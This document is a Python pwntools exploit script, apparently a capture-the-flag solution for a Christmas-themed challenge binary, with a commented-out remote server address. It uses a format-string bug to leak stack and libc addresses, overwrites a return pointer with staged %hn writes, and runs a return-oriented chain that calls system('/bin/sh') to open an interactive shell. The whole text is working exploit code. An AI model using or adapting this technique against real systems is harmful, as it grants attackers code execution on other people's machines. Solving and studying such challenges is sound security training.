#!/usr/bin/python3
from pwn import *

#elf = context.binary = ELF("chall_patched")

gdbscript = '''
b *$rebase(0x159c)
b *$rebase(0x152a)
c
'''

io = gdb.debug("./original_chall", gdbscript=gdbscript)
#io = process("./original_chall")
#io = remote("34.42.147.172",4003)

# Christmas function has 1 byte overflow
io.sendlineafter(b"(gift/flag)", b"%"*9)
io.recvline()
leak = io.recvline()[:14]

leak = int(leak, 16)
log.info(f"{leak = :#x}")

ret_to_main_ptr = leak + 0x90
log.info(f"{ret_to_main_ptr = :#x}")

dup_ptr = leak + 0x124
stdout = 0x1

stage_1 = f"%42c%10$hhn%216c%11$hhn".encode().ljust(0x20,b'\x00') + p64(ret_to_main_ptr) + p64(dup_ptr)

io.send(stage_1)

stage_2 = f"%116c%10$hhn|%25$p_\x00".encode().ljust(0x20, b'\x00') + p64(ret_to_main_ptr)

sleep(2)
io.send(stage_2)

libc_leak = io.recvuntil(b'_')
libc_leak = int(libc_leak.split(b'|')[1][:-1],16)

libc_base = libc_leak - 0x2a1ca

log.info(f"{libc_base = :#x}")


#0x000000000002b465: pop rbx; pop r12; pop r13; pop r14; pop rbp; ret;
mega_pop = libc_base + 0x000000000002b465
log.info(f"{mega_pop = :#x}")

lower_16 = mega_pop & 0xffff 
middle_16 = (65536 - lower_16) + ((mega_pop >> 16) & 0xffff) 
high_16 = (65536 - ((mega_pop >> 16) & 0xffff)) + ((mega_pop >> 32) & 0xffff)



ret = p64(libc_base + 0x000000000010f75b + 1) 
pop_rdi = p64(libc_base + 0x000000000010f75b)
binsh = p64(libc_base + 0x001cb42f)
system = p64(libc_base + 0x58740)
rop_chain = [
    pop_rdi,
    binsh,
    ret,
    system
]

rop_chain = b''.join(rop_chain)

stage_3 = f"%{lower_16}c%15$hn%{middle_16}c%16$hn%{high_16}c%17$hn".encode().ljust(40,b'\x00') + rop_chain + p64(ret_to_main_ptr) + p64(ret_to_main_ptr+2) + p64(ret_to_main_ptr+4)

io.send(stage_3)

io.interactive()
